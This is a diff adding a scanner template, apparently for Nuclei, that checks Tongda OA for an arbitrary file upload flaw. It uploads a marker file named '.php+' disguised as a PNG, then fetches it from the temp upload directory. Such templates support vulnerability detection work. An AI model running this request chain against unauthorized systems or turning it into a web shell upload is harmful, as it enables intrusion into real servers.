@@ -1,0 +1,51 @@
+id: poc-tongda-oa-privateupload-anyfile-upload
+info:
+  name: Tongda OA privateUpload Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: "file-upload"
+    method: POST
+    path:
+      - "{{BaseURL}}/general/vmeet/privateUpload.php?fileName={{t1}}.php+"
+    headers:
+      Content-Type: "multipart/form-data; boundary=00content0boundary00"
+    body: |-
+      --00content0boundary00
+      Content-Disposition: form-data; name="Filedata"; filename="1.png"
+      Content-Type: image/png
+
+      {{t2}}
+      --00content0boundary00--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+    extractors:
+      - type: dsl
+        dsl:
+          - "t1" # Capture `t1` value for subsequent requests
+
+  - id: "file-access"
+    method: GET
+    path:
+      - "{{BaseURL}}/general/vmeet/upload/temp/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
